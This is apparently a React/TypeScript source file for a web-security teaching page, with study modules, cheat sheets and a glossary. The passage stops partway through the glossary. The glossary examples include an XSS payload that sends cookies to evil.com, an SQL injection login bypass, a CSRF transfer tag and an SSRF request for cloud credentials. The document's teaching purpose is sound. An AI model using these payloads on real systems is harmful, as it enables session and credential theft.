import { useState, useMemo } from "react";
import { useApp } from "../context/AppContext";
import { Icon } from "../components/ui/Icon";
import type { IconName } from "../components/ui/Icon";
import {
  Chip,
  GlowCard,
  PremiumButton,
  Reveal,
  SectionHeader,
  accentHex,
  accentText,
  cx,
} from "../components/ui/primitives";

/* ------------------------------------------------------------------ */
/* Core Security Principles (Foundations)                             */
/* ------------------------------------------------------------------ */

interface Principle {
  icon: IconName;
  accent: string;
  title: string;
  subtitle: string;
  body: string;
}

const FOUNDATIONS: Principle[] = [
  {
    icon: "shield",
    accent: "cyan",
    title: "The CIA Triad",
    subtitle: "Confidentiality, Integrity, Availability",
    body: "Every security control protects one or more pillars: Confidentiality (only authorized parties view data), Integrity (data is accurate and un-tampered), and Availability (systems remain accessible to authorized users when needed).",
  },
  {
    icon: "eye",
    accent: "violet",
    title: "Never Trust Client Input",
    subtitle: "Assume all input is hostile",
    body: "Anything originating outside your server boundary — query strings, POST bodies, headers, cookies, API payloads, and even file names — is attacker-controllable. Validate strictly on the server using allow-lists, not block-lists.",
  },
  {
    icon: "lock",
    accent: "primary",
    title: "Principle of Least Privilege",
    subtitle: "Minimum necessary permissions",
    body: "Users, applications, and system processes should only have access to the exact resources required to perform their intended function. Granting broad 'Admin' or root privileges creates catastrophic single points of failure.",
  },
  {
    icon: "layers",
    accent: "success",
    title: "Defence in Depth",
    subtitle: "Layered, redundant safeguards",
    body: "Assume individual controls will eventually fail. By combining network firewalls, strict access controls, input validation, context-aware encoding, secure headers, and runtime monitoring, a breach in one layer is stopped by the next.",
  },
  {
    icon: "server",
    accent: "warning",
    title: "Zero Trust Architecture",
    subtitle: "Never trust, always verify",
    body: "Traditional perimeter security assumes everything inside the network is safe. Zero Trust treats all requests as potentially hostile, requiring mutual authentication, per-request authorization, and micro-segmentation at every hop.",
  },
  {
    icon: "zap",
    accent: "cyan",
    title: "Fail Securely",
    subtitle: "Safe error handling",
    body: "When exceptions, database disconnects, or validation checks fail, the system must default to the most secure state: access denied, generic error messages, and no debug traces exposed to end users.",
  },
];

/* ------------------------------------------------------------------ */
/* Deep-Dive Study Modules with Real Case Studies & Attack Blueprints */
/* ------------------------------------------------------------------ */

interface Section {
  heading: string;
  body: string;
  codeSnippet?: string;
}

interface Module {
  labId: string;
  number: string;
  icon: IconName;
  accent: string;
  domain: string;
  title: string;
  readMinutes: number;
  owaspRef: string;
  cweRef: string;
  intro: string;
  realWorldBreach: {
    target: string;
    year: string;
    impact: string;
    lesson: string;
  };
  sections: Section[];
  defenseChecklist: string[];
  keyTerms: string[];
}

const MODULES: Module[] = [
  {
    labId: "auth",
    number: "01",
    icon: "fingerprint",
    accent: "cyan",
    domain: "Authentication",
    title: "Proving Identity & Preventing Account Takeover",
    readMinutes: 8,
    owaspRef: "A07:2021 - Identification & Authentication Failures",
    cweRef: "CWE-287 / CWE-204",
    intro:
      "Authentication is the gatekeeper of your entire application. When authentication mechanisms leak information or fail to enforce rate limits, attackers map user bases and execute automated credential stuffing attacks.",
    realWorldBreach: {
      target: "Major Web Services & Streaming Platforms",
      year: "Recurring Industry Threat",
      impact: "Billions of leaked password records tested through automated botnets against portals leaking account validity.",
      lesson: "Single-generic failure responses, CAPTCHA on anomalous traffic, and mandatory MFA eliminate 99.9% of automated attacks.",
    },
    sections: [
      {
        heading: "The Core Mechanism & Trust Boundary",
        body: "A login endpoint accepts a claim (username/email) and verification secret (password/token). The application must evaluate both without giving away which part of the pair failed. If the server reveals 'User not found' vs 'Incorrect password', it hands attackers an active directory list of valid accounts.",
      },
      {
        heading: "Attack Anatomy: Username Enumeration & Password Spraying",
        body: "Attackers script HTTP requests with dictionary lists of employee names. By analyzing status codes, text variations, or microsecond timing differentials (response times), they filter thousands of usernames down to a verified list of active accounts for targeted brute-forcing.",
        codeSnippet: `// ❌ INSECURE: Leaks account existence\nif (!userExists(email)) {\n  return res.status(404).json({ error: "No account found with this email" });\n}\nif (!verifyPassword(password, user.hash)) {\n  return res.status(401).json({ error: "Invalid password for user" });\n}\n\n// ✅ SECURE: Identical generic response with constant-time check\nconst user = findUserOrDummy(email);\nconst isValid = verifyPasswordConstantTime(password, user.hash);\nif (!user.isReal || !isValid) {\n  return res.status(401).json({ error: "Invalid email or password" });\n}`,
      },
      {
        heading: "Session Lifecycle & Replay Prevention",
        body: "Upon authentication, session identifiers must be generated with cryptographically secure random number generators (CSPRNG) with at least 128 bits of entropy. Sessions must immediately regenerate upon privilege changes (preventing Session Fixation) and terminate on explicit logout or inactivity timeouts.",
      },
    ],
    defenseChecklist: [
      "Return uniform error responses: 'Invalid email or password' for all failure modes.",
      "Implement adaptive rate limiting (e.g. 5 failed attempts per IP/user triggers exponential backoff or CAPTCHA).",
      "Enforce modern multi-factor authentication (TOTP RFC 6238 or FIDO2/WebAuthn hardware keys).",
      "Store passwords using modern memory-hard key derivation functions (Argon2id, bcrypt cost >= 12, or scrypt).",
      "Regenerate session tokens upon successful login to prevent session fixation attacks.",
    ],
    keyTerms: ["Username Enumeration", "Credential Stuffing", "MFA / WebAuthn", "Argon2id / bcrypt", "Rate Limiting", "CSPRNG"],
  },
  {
    labId: "authz",
    number: "02",
    icon: "key",
    accent: "primary",
    domain: "Authorization",
    title: "Broken Object-Level Authorization (IDOR / BOLA)",
    readMinutes: 9,
    owaspRef: "A01:2021 - Broken Access Control (Rank #1)",
    cweRef: "CWE-639 / CWE-284 / CWE-285",
    intro:
      "Broken Access Control is currently the #1 vulnerability on the OWASP Top 10. Insecure Direct Object References (IDOR) occur when an application relies on client-provided IDs to fetch records without validating that the authenticated session actually owns that resource.",
    realWorldBreach: {
      target: "Telecommunications & Healthcare Portals",
      year: "2022 - 2024",
      impact: "Over 10 million subscriber records exposed through sequential customer_id parameters in unauthenticated API endpoints.",
      lesson: "Obscurity is not security. Every database query fetching user data MUST include a tenant/user ID predicate bound to the verified session.",
    },
    sections: [
      {
        heading: "Why IDOR Flaws Happen",
        body: "Developers often check if a user is logged in (Authentication) but forget to check if they have permission to access the specific database row (Authorization). When endpoints look like GET /api/documents?id=4920, incrementing the integer to 4921 fetches another user's document.",
      },
      {
        heading: "Horizontal vs. Vertical Privilege Escalation",
        body: "Horizontal Escalation: A standard user accesses data belonging to another standard user with identical privileges (e.g., viewing another customer's bank statement). Vertical Escalation: A regular user accesses administrative functions or resources (e.g., executing /api/admin/deleteUser without admin role).",
        codeSnippet: `// ❌ INSECURE: Relies entirely on client-supplied ID\napp.get('/api/invoice/:invoiceId', authenticateUser, async (req, res) => {\n  const invoice = await db.invoices.findById(req.params.invoiceId);\n  res.json(invoice); // Anyone logged in can see ANY invoice!\n});\n\n// ✅ SECURE: Scoped to authenticated session ownership\napp.get('/api/invoice/:invoiceId', authenticateUser, async (req, res) => {\n  const invoice = await db.invoices.findOne({\n    _id: req.params.invoiceId,\n    userId: req.user.id // Enforced database-level boundary\n  });\n  if (!invoice) return res.status(404).json({ error: "Invoice not found" });\n  res.json(invoice);\n});`,
      },
      {
        heading: "UUIDs vs. Server-Side Access Control",
        body: "Replacing sequential IDs (1, 2, 3) with UUIDv4 strings makes guessing harder, but it is NOT an access control mechanism. If a UUID leaks in a referrer header, logs, or shared link, an unprotected endpoint will still expose the record. Robust authorization checks must always validate ownership.",
      },
    ],
    defenseChecklist: [
      "Bind all CRUD database queries to `session.userId` or enforce strict Role-Based Access Control (RBAC).",
      "Adopt a 'Deny by Default' policy in middleware and API gateways.",
      "Use cryptographically random UUIDv4 or nano IDs instead of predictable sequential integer IDs.",
      "Implement automated API security testing for authorization bypass across all tenant boundaries.",
      "Disable directory listing and protect administrative routes with strict role guards.",
    ],
    keyTerms: ["IDOR / BOLA", "Horizontal Escalation", "Vertical Escalation", "RBAC / ABAC", "Deny by Default", "UUIDv4"],
  },
  {
    labId: "input",
    number: "03",
    icon: "code",
    accent: "violet",
    domain: "Input Validation",
    title: "Injection Prevention & Context-Aware Output Encoding",
    readMinutes: 10,
    owaspRef: "A03:2021 - Injection (XSS, SQLi, Command Injection)",
    cweRef: "CWE-79 (XSS) / CWE-89 (SQLi) / CWE-78 (OS Cmd)",
    intro:
      "Injection occurs when untrusted user data is concatenated directly into interpreters (HTML, SQL, Shell, LDAP) without proper sanitization or context-aware encoding, tricking the parser into executing attacker instructions.",
    realWorldBreach: {
      target: "British Airways & Ticketmaster (Magecart)",
      year: "2018",
      impact: "Over 380,000 payment card records stolen by injecting malicious JavaScript scripts that exfiltrated credit card keystrokes.",
      lesson: "Strict Content-Security-Policy (CSP), context-aware escaping, and Subresource Integrity (SRI) prevent malicious script execution.",
    },
    sections: [
      {
        heading: "The Root Cause of Injection",
        body: "Computers execute commands by parsing data streams. When code (instructions) and data (user inputs) are mixed without explicit delimiters, an attacker can input special characters (', \", <script>, ;) that change how the interpreter understands the remainder of the sentence.",
      },
      {
        heading: "The Three Types of Cross-Site Scripting (XSS)",
        body: "1. Reflected XSS: Malicious payload in a URL/search query is immediately echoed back in the HTML response. 2. Stored XSS: Injected script is saved in the database (e.g. comments, profile names) and served to all future visitors. 3. DOM-based XSS: Vulnerability exists purely in client-side JavaScript (e.g., using innerHTML, eval, or document.write with user input).",
        codeSnippet: `// ❌ INSECURE: Direct HTML injection (DOM XSS)\ndocument.getElementById('greeting').innerHTML = 'Hello, ' + userInput;\n\n// ✅ SECURE: Safe text node assignment (auto-escaped by browser)\ndocument.getElementById('greeting').textContent = 'Hello, ' + userInput;\n\n// ❌ INSECURE: SQL String Concatenation\nconst query = "SELECT * FROM users WHERE email = '" + req.body.email + "'";\n\n// ✅ SECURE: Parameterized Prepared Statements (DB treats input strictly as data)\nconst query = "SELECT * FROM users WHERE email = ?";\ndb.query(query, [req.body.email]);`,
      },
      {
        heading: "Context-Aware Encoding vs. Sanitization",
        body: "Escaping must match where data is placed: HTML Body (`&` to `&amp;`, `<` to `&lt;`), HTML Attributes (quote escaping), JavaScript Variables (`\\xHH` hex encoding), or URLs (`encodeURIComponent`). Modern UI frameworks (React, Vue, Angular) auto-escape inside template bindings.",
      },
    ],
    defenseChecklist: [
      "Always use Parameterized Queries / Prepared Statements or Object-Relational Mappers (ORMs) for SQL.",
      "Use safe DOM APIs: `.textContent` and `.setAttribute()` instead of `.innerHTML` or `eval()`.",
      "Deploy a strict `Content-Security-Policy` header to prevent execution of unauthorized inline scripts.",
      "Validate input using strict allow-lists (regex, schemas, type checks) before processing.",
      "Set `HttpOnly` on sensitive session cookies so XSS cannot access `document.cookie`.",
    ],
    keyTerms: ["Reflected XSS", "Stored XSS", "DOM XSS", "Prepared Statements", "Context-Aware Encoding", "Content Security Policy"],
  },
  {
    labId: "config",
    number: "04",
    icon: "server",
    accent: "warning",
    domain: "Security Configuration",
    title: "Server Hardening & Secure Default Baselines",
    readMinutes: 8,
    owaspRef: "A05:2021 - Security Misconfiguration",
    cweRef: "CWE-16 / CWE-200 / CWE-942",
    intro:
      "Most real-world breaches don't require zero-day exploits. They happen because production environments leave debugging enabled, use default credentials, expose internal stack traces, or configure overly permissive CORS policies.",
    realWorldBreach: {
      target: "Equifax",
      year: "2017",
      impact: "147 million consumers affected due to unpatched Apache Struts configuration and internal network segmentation gaps.",
      lesson: "Automated vulnerability scanning, hardened baseline configurations, and removing default accounts are mandatory.",
    },
    sections: [
      {
        heading: "The Danger of Development Defaults in Production",
        body: "Frameworks (Django, Express, Spring, Laravel) ship with defaults optimized for local developer convenience: verbose debug pages, stack traces displaying environment variables/passwords, and wildcard CORS headers. If these reach production, attackers gain instant reconnaissance.",
      },
      {
        heading: "Cross-Origin Resource Sharing (CORS) Misconfiguration",
        body: "CORS allows web apps to request resources from a different origin. Setting `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` is an invalid combination in browsers, but echoing the incoming `Origin` header dynamically allows any malicious website to read authenticated user responses.",
        codeSnippet: `// ❌ INSECURE: Echoing arbitrary origin with credentials\napp.use((req, res, next) => {\n  res.header("Access-Control-Allow-Origin", req.headers.origin); // Dangerous!\n  res.header("Access-Control-Allow-Credentials", "true");\n  next();\n});\n\n// ✅ SECURE: Strict allow-list of trusted production domains\nconst TRUSTED_ORIGINS = new Set(["https://portal.company.com", "https://api.company.com"]);\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  if (TRUSTED_ORIGINS.has(origin)) {\n    res.header("Access-Control-Allow-Origin", origin);\n    res.header("Access-Control-Allow-Credentials", "true");\n  }\n  next();\n});`,
      },
      {
        heading: "Hardening Principles & CIS Benchmarks",
        body: "Systems should follow Center for Internet Security (CIS) benchmarks: remove all unnecessary packages/services, disable directory listing, change all default administrative passwords, and ensure least-privilege file permissions on configuration files.",
      },
    ],
    defenseChecklist: [
      "Explicitly set `NODE_ENV=production` / `DEBUG=false` across all staging and production deployments.",
      "Disable server version banners (`Server`, `X-Powered-By: Express`) to prevent automated version reconnaissance.",
      "Restrict CORS to explicit, trusted domain origins — never echo arbitrary `Origin` headers with credentials.",
      "Store secrets in environment variables or cloud secret managers (AWS Secrets Manager, HashiCorp Vault), never in git.",
      "Disable directory indexing on web servers (Nginx `autoindex off`, Apache `Options -Indexes`).",
    ],
    keyTerms: ["CIS Benchmarks", "Hardening", "CORS Misconfiguration", "Information Disclosure", "Secrets Management", "Least Functionality"],
  },
  {
    labId: "http",
    number: "05",
    icon: "globe",
    accent: "success",
    domain: "HTTP & Network Security",
    title: "Traffic Analysis, Security Headers & Cookie Flags",
    readMinutes: 9,
    owaspRef: "A05:2021 - Security Misconfiguration / Transport Layer Security",
    cweRef: "CWE-614 / CWE-1004 / CWE-319",
    intro:
      "HTTP is the fundamental transport protocol of the modern web. Securing the communication channel requires enforcing HTTPS, protecting session tokens with strict cookie attributes, and instructing browsers to activate modern security mitigations through HTTP response headers.",
    realWorldBreach: {
      target: "Public Wi-Fi & Unsecured Corporate Networks",
      year: "Ongoing Threat",
      impact: "Man-in-the-Middle (MitM) session hijacking by sniffing cleartext cookies over non-HSTS HTTP connections.",
      lesson: "Strict HSTS preloading and triple-flagged cookies (Secure, HttpOnly, SameSite=Strict) prevent transport interception.",
    },
    sections: [
      {
        heading: "The Essential Security Headers",
        body: "HTTP response headers instruct modern browsers to enforce strict security boundaries. Missing headers leave users vulnerable to clickjacking, MIME-type sniffing, cross-site leaks, and SSL stripping attacks.",
        codeSnippet: `// Recommended Production HTTP Response Headers:\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\nContent-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'\nX-Content-Type-Options: nosniff\nX-Frame-Options: DENY\nReferrer-Policy: strict-origin-when-cross-origin\nPermissions-Policy: camera=(), microphone=(), geolocation=()`,
      },
      {
        heading: "The Cookie Security Trio: Secure, HttpOnly, SameSite",
        body: "`Secure`: Ensures the cookie is ONLY transmitted over encrypted HTTPS connections, preventing plaintext sniffing. `HttpOnly`: Blocks client-side JavaScript (`document.cookie`) from accessing the token, mitigating XSS session theft. `SameSite`: Controls whether cookies are sent with cross-site requests, mitigating Cross-Site Request Forgery (CSRF).",
      },
      {
        heading: "Clickjacking & Frame Busting",
        body: "Clickjacking involves embedding a target website inside an invisible `<iframe>` on a malicious site, tricking the user into clicking buttons (e.g., 'Confirm Transfer'). Setting `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'` completely blocks third-party iframe embedding.",
      },
    ],
    defenseChecklist: [
      "Enforce HTTPS with `Strict-Transport-Security` (HSTS) with at least 1-year max-age and subdomains included.",
      "Always set `Secure`, `HttpOnly`, and `SameSite=Lax` or `SameSite=Strict` on session cookies.",
      "Add `X-Content-Type-Options: nosniff` to prevent browsers from interpreting non-script files as scripts.",
      "Set `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'` to eliminate clickjacking risks.",
      "Enforce minimal `Referrer-Policy` (e.g. `strict-origin-when-cross-origin`) to prevent sensitive query tokens from leaking.",
    ],
    keyTerms: ["HSTS", "SameSite Cookies", "HttpOnly", "Clickjacking (X-Frame-Options)", "MIME Sniffing", "CSRF Protection"],
  },
];

/* ------------------------------------------------------------------ */
/* Quick Reference Cheat Sheets (Tabbed / Filterable)                 */
/* ------------------------------------------------------------------ */

interface CheatSheetItem {
  key: string;
  badge?: string;
  badgeType?: "good" | "warn" | "neutral";
  desc: string;
  recommendedValue?: string;
}

interface CheatSheetCategory {
  id: string;
  title: string;
  icon: IconName;
  items: CheatSheetItem[];
}

const CHEAT_SHEETS: CheatSheetCategory[] = [
  {
    id: "headers",
    title: "Essential Security Headers",
    icon: "layers",
    items: [
      {
        key: "Strict-Transport-Security (HSTS)",
        badge: "Mandatory",
        badgeType: "good",
        desc: "Forces the browser to always connect via HTTPS, preventing SSL stripping and downgrade attacks.",
        recommendedValue: "max-age=31536000; includeSubDomains; preload",
      },
      {
        key: "Content-Security-Policy (CSP)",
        badge: "Critical",
        badgeType: "good",
        desc: "Restricts which scripts, styles, images, and fonts are permitted to load and execute.",
        recommendedValue: "default-src 'self'; script-src 'self'; object-src 'none';",
      },
      {
        key: "X-Content-Type-Options",
        badge: "Essential",
        badgeType: "good",
        desc: "Stops browsers from MIME-sniffing a response away from the declared content-type.",
        recommendedValue: "nosniff",
      },
      {
        key: "X-Frame-Options",
        badge: "Essential",
        badgeType: "good",
        desc: "Prevents your pages from being embedded in iframes on malicious sites, stopping clickjacking.",
        recommendedValue: "DENY (or SAMEORIGIN)",
      },
      {
        key: "Referrer-Policy",
        badge: "Privacy",
        badgeType: "neutral",
        desc: "Controls how much referrer information (URL parameters, paths) is included with outgoing requests.",
        recommendedValue: "strict-origin-when-cross-origin",
      },
      {
        key: "Permissions-Policy",
        badge: "Hardening",
        badgeType: "neutral",
        desc: "Disables browser hardware features (camera, microphone, geolocation) by default.",
        recommendedValue: "camera=(), microphone=(), geolocation=()",
      },
    ],
  },
  {
    id: "cookies",
    title: "Cookie Security Attributes",
    icon: "lock",
    items: [
      {
        key: "Secure Flag",
        badge: "HTTPS Only",
        badgeType: "good",
        desc: "Ensures the browser never transmits the cookie over unencrypted plain HTTP connections.",
        recommendedValue: "Set-Cookie: session=...; Secure",
      },
      {
        key: "HttpOnly Flag",
        badge: "XSS Defense",
        badgeType: "good",
        desc: "Hides the cookie from JavaScript (document.cookie), making it immune to theft via XSS injection.",
        recommendedValue: "Set-Cookie: session=...; HttpOnly",
      },
      {
        key: "SameSite=Lax",
        badge: "Default CSRF Guard",
        badgeType: "good",
        desc: "Cookies withheld on cross-site subrequests (images, forms) but sent on top-level incoming navigations.",
        recommendedValue: "Set-Cookie: session=...; SameSite=Lax",
      },
      {
        key: "SameSite=Strict",
        badge: "Max CSRF Guard",
        badgeType: "good",
        desc: "Cookie is strictly withheld on ALL cross-site requests, including direct link clicks from external sites.",
        recommendedValue: "Set-Cookie: session=...; SameSite=Strict",
      },
      {
        key: "__Host- Prefix",
        badge: "Domain Lock",
        badgeType: "neutral",
        desc: "Enforces that the cookie has Secure flag, Path=/, and cannot be overwritten by subdomains.",
        recommendedValue: "Set-Cookie: __Host-id=...; Secure; Path=/; HttpOnly",
      },
    ],
  },
  {
    id: "status-codes",
    title: "HTTP Status Codes & Security Meaning",
    icon: "activity",
    items: [
      {
        key: "200 OK",
        desc: "Request succeeded. Ensure sensitive responses include Cache-Control: no-store.",
      },
      {
        key: "301 Moved Permanently",
        desc: "Permanent redirect. Used to redirect HTTP traffic to HTTPS (alongside HSTS).",
      },
      {
        key: "400 Bad Request",
        desc: "Malformed request syntax. Return generic validation errors, never internal stack traces.",
      },
      {
        key: "401 Unauthorized",
        desc: "Authentication required or credentials invalid. (Meaning: 'You are not logged in').",
      },
      {
        key: "403 Forbidden",
        desc: "Authenticated, but access denied by authorization policy. (Meaning: 'You cannot touch this').",
      },
      {
        key: "404 Not Found",
        desc: "Resource does not exist or hidden for authorization defense (preventing IDOR enumeration).",
      },
      {
        key: "429 Too Many Requests",
        desc: "Rate limit triggered. Essential defense against brute-force and DDoS scraping.",
      },
      {
        key: "500 Internal Server Error",
        desc: "Uncaught backend exception. Critical: Must NEVER expose file paths, SQL errors, or stack traces.",
      },
    ],
  },
  {
    id: "owasp-top10",
    title: "OWASP Top 10 (2021 Reference)",
    icon: "shield",
    items: [
      { key: "A01: Broken Access Control", desc: "Failures enforcing authorization rules; users acting outside their intended permissions (IDOR, BOLA)." },
      { key: "A02: Cryptographic Failures", desc: "Exposure of sensitive data due to weak algorithms (MD5, SHA1), missing encryption in transit or at rest." },
      { key: "A03: Injection", desc: "Hostile data sent to an interpreter (SQL, XSS, OS Command, LDAP, NoSQL) executed as commands." },
      { key: "A04: Insecure Design", desc: "Flaws in architecture, threat modeling, and business logic that cannot be fixed by coding alone." },
      { key: "A05: Security Misconfiguration", desc: "Unpatched flaws, default accounts, debug mode enabled, open cloud storage, permissive CORS." },
      { key: "A06: Vulnerable & Outdated Components", desc: "Running libraries, frameworks, or dependencies with known public vulnerabilities (CVEs)." },
      { key: "A07: Identification & Auth Failures", desc: "Permitting credential stuffing, weak password requirements, missing brute-force protection, missing MFA." },
      { key: "A08: Software & Data Integrity Failures", desc: "Unverified software updates, untrusted CI/CD pipelines, insecure deserialization flaws." },
      { key: "A09: Security Logging & Monitoring Failures", desc: "Failures to log security events, audit breaches, or detect active intrusions in real-time." },
      { key: "A10: Server-Side Request Forgery (SSRF)", desc: "Server tricked into fetching a remote resource (e.g. cloud metadata 169.254.169.254) on behalf of attacker." },
    ],
  },
];

/* ------------------------------------------------------------------ */
/* Recommended Free Tools & Practice Resources                        */
/* ------------------------------------------------------------------ */

interface LearningResource {
  title: string;
  category: string;
  url: string;
  desc: string;
  icon: IconName;
}

const EXTERNAL_RESOURCES: LearningResource[] = [
  {
    title: "OWASP Cheat Sheet Series",
    category: "Official Reference",
    url: "https://cheatsheetseries.owasp.org/",
    desc: "Concise security guidance written by top security architects covering authentication, REST APIs, headers, and crypto.",
    icon: "shield",
  },
  {
    title: "PortSwigger Web Security Academy",
    category: "Hands-on Practice",
    url: "https://portswigger.net/web-security",
    desc: "The gold standard for interactive web security labs covering SQLi, XSS, CSRF, SSRF, OAuth, and API security for free.",
    icon: "terminal",
  },
  {
    title: "CyberChef — The Cyber Swiss Army Knife",
    category: "Security Utility",
    url: "https://gchq.github.io/CyberChef/",
    desc: "GCHQ's browser tool for decoding Base64, Hex, URL encoding, parsing JWTs, hashing, and inspecting payloads in real-time.",
    icon: "tool",
  },
  {
    title: "Mozilla Web Security Guidelines",
    category: "Standards & Hardening",
    url: "https://infosec.mozilla.org/guidelines/web_security",
    desc: "Production-ready guidelines for HTTP security headers, TLS ciphers, cookie configurations, and CSP directives.",
    icon: "globe",
  },
  {
    title: "NVD (National Vulnerability Database)",
    category: "CVE Research",
    url: "https://nvd.nist.gov/",
    desc: "U.S. government repository of standards-based vulnerability management data using the Common Vulnerabilities and Exposures (CVE) system.",
    icon: "database",
  },
  {
    title: "NIST Cybersecurity Framework (CSF)",
    category: "Framework & Policy",
    url: "https://www.nist.gov/cyberframework",
    desc: "Global benchmark framework for organizational risk assessment: Identify, Protect, Detect, Respond, and Recover.",
    icon: "layers",
  },
];

/* ------------------------------------------------------------------ */
/* Expanded Cybersecurity Glossary (30+ Terms)                        */
/* ------------------------------------------------------------------ */

interface GlossaryEntry {
  term: string;
  category: "Fundamentals" | "Attacks" | "Defense" | "Protocols" | "Crypto";
  definition: string;
  example: string;
  mitigation: string;
}

const GLOSSARY: GlossaryEntry[] = [
  {
    term: "CIA Triad",
    category: "Fundamentals",
    definition: "The core benchmark model for information security: Confidentiality (data is protected from unauthorized viewing), Integrity (data is protected from unauthorized modification or tampering), and Availability (systems and data remain reliably accessible to authorized users when needed).",
    example: "A ransomware attack encrypts a hospital's patient records — this destroys Availability. A hacker stealing credit card numbers breaks Confidentiality. An attacker modifying bank balances breaks Integrity.",
    mitigation: "Enforce end-to-end encryption (Confidentiality), cryptographic hashing/signatures (Integrity), and redundant cloud backups/DDoS protection (Availability).",
  },
  {
    term: "Trust Boundary",
    category: "Fundamentals",
    definition: "The architectural perimeter separating code you control and trust (e.g. backend database and internal microservices) from external untrusted data sources (e.g. public internet, user form inputs, query strings, headers, and third-party APIs).",
    example: "A web app assumes an HTTP header `X-User-Role: Admin` was set by an internal load balancer, but an external client crafts that header directly in Postman and gets admin access.",
    mitigation: "Never trust data crossing the perimeter. Validate and sanitize all incoming parameters on the server side using strict allow-lists.",
  },
  {
    term: "Authentication (AuthN)",
    category: "Fundamentals",
    definition: "The mechanism of proving an entity's claimed identity — answering the fundamental question 'Who are you?'. It relies on three factors: something you know (password/PIN), something you have (hardware token/authenticator app), or something you are (biometrics/fingerprint).",
    example: "Submitting a username and password along with a 6-digit TOTP authenticator code to log into your cloud dashboard.",
    mitigation: "Enforce multi-factor authentication (MFA/WebAuthn), modern password hashing (Argon2id/bcrypt), and generic failure messages to stop enumeration.",
  },
  {
    term: "Authorization (AuthZ)",
    category: "Fundamentals",
    definition: "The policy enforcement process that determines what an already-authenticated user is allowed to access or execute — answering 'What are you permitted to do?'. Occurs strictly after authentication.",
    example: "A logged-in junior employee tries to open `/api/payroll/all-salaries`. The authentication check passes (they are logged in), but the authorization guard blocks them (role is not 'HR Manager').",
    mitigation: "Adopt Role-Based Access Control (RBAC) or Attribute-Based Access Control (ABAC) with a 'Deny by Default' policy on every individual endpoint.",
  },
  {
    term: "Least Privilege",
    category: "Defense",
    definition: "A security design principle requiring that every user, service account, background worker, and database connection operate with only the minimum privileges essential for its specific job function, and nothing more.",
    example: "A web application's database user only has `SELECT` and `INSERT` permissions on the `comments` table, rather than having full `DB_ADMIN` or `DROP TABLE` permissions.",
    mitigation: "Audit system roles quarterly, avoid running processes as `root`/`Administrator`, and separate read-only database connections from read-write pools.",
  },
  {
    term: "Defense in Depth",
    category: "Defense",
    definition: "A layered defensive architecture where multiple redundant, independent security controls are deployed so that if one security barrier is breached or misconfigured, subsequent layers prevent total system compromise.",
    example: "If an attacker discovers an XSS vulnerability, a strict Content-Security-Policy (CSP) prevents malicious script execution, and `HttpOnly` cookie flags prevent session theft.",
    mitigation: "Layer network firewalls, WAFs, input validation, context-aware encoding, secure HTTP headers, and continuous SIEM logging together.",
  },
  {
    term: "Zero Trust Architecture",
    category: "Defense",
    definition: "A modern security paradigm operating under the rule 'Never trust, always verify'. It removes the outdated concept of an implicit trusted corporate network; every request must be authenticated, authorized, and encrypted before granting access.",
    example: "An engineer connecting from an office desktop must still pass MFA, have a verified healthy device posture, and authenticate via mutual TLS (mTLS) to reach an internal microservice.",
    mitigation: "Implement micro-segmentation, identity-aware proxies (BeyondCorp model), and continuous session health validation.",
  },
  {
    term: "IDOR / BOLA",
    category: "Attacks",
    definition: "Insecure Direct Object Reference / Broken Object Level Authorization. Occurs when an application accepts a direct user-supplied resource identifier (e.g. database ID) in an API request and returns the record without verifying that the current user owns it.",
    example: "User logs in as Account #101 and visits `GET /api/medical-records?id=101`. Changing the URL parameter to `id=102` immediately returns another patient's private medical file.",
    mitigation: "Always scope database queries to the verified session identity: `SELECT * FROM records WHERE id = ? AND user_id = session.user_id`.",
  },
  {
    term: "Cross-Site Scripting (XSS)",
    category: "Attacks",
    definition: "A code injection vulnerability where malicious JavaScript is inserted into trusted web applications and executed inside the victim's browser session, allowing attackers to steal session cookies, capture keystrokes, or redirect users.",
    example: "An attacker posts a comment containing `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`. When other users view the comment, the script runs in their browser.",
    mitigation: "Perform context-aware output encoding (HTML, attribute, JS escaping), use safe DOM methods (`.textContent`), set `HttpOnly` on session cookies, and deploy a strict CSP.",
  },
  {
    term: "SQL Injection (SQLi)",
    category: "Attacks",
    definition: "An injection attack occurring when untrusted user input is directly concatenated into SQL query strings, allowing an adversary to alter query syntax, bypass authentication, extract database dumps, or execute remote commands.",
    example: "Entering `' OR '1'='1' --` into a login username box turns `SELECT * FROM users WHERE user = '$USER_INPUT'` into a condition that always evaluates to true, logging in without a password.",
    mitigation: "Always use Prepared Statements (Parameterized Queries) or Object-Relational Mappers (ORMs). Never concatenate strings into SQL statements.",
  },
  {
    term: "Cross-Site Request Forgery (CSRF)",
    category: "Attacks",
    definition: "An attack that tricks an authenticated victim browser into submitting unauthorized, malicious state-changing requests (e.g., funds transfer, password change) to a vulnerable application that trusts the victim's session cookies.",
    example: "A user is logged into their bank. They visit an attacker's website containing `<img src='https://bank.com/transfer?to=attacker&amount=5000'>`. The browser automatically sends bank session cookies.",
    mitigation: "Use `SameSite=Lax` or `SameSite=Strict` cookie attributes and validate cryptographically random anti-CSRF synchronizer tokens on all state-changing POST/PUT requests.",
  },
  {
    term: "Server-Side Request Forgery (SSRF)",
    category: "Attacks",
    definition: "A vulnerability where a server-side web application is coerced into making HTTP or network requests to an arbitrary destination chosen by the attacker, often targeting internal microservices, loopback adapters, or cloud metadata endpoints.",
    example: "An avatar upload feature accepts a URL `https://example.com/pic.png`. The attacker inputs `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to steal AWS cloud credentials.",
    mitigation: "Validate and parse target URLs against strict allow-lists of protocols and domains, block private IP ranges (RFC 1918, 127.0.0.1, 169.254.169.254), and disable HTTP redirects.",
  },
  {
    term: "Credential Stuffing",
    category: "Attacks",
    definition: "The automated mass-testing of stolen combinations of usernames, emails, and passwords obtained from third-party data breaches across hundreds of popular online services, exploiting password re-use by victims.",
    example: "A botnet tests 5,000,000 email/password pairs dumped from an old social media breach against an e-commerce login portal, successfully compromising 50,000 accounts.",
    mitigation: "Deploy rate limiting, bot detection/WAF, CAPTCHAs on anomalous traffic, check against HaveIBeenPwned breach APIs, and enforce mandatory MFA.",
  },
  {
    term: "Brute Force & Password Spraying",
    category: "Attacks",
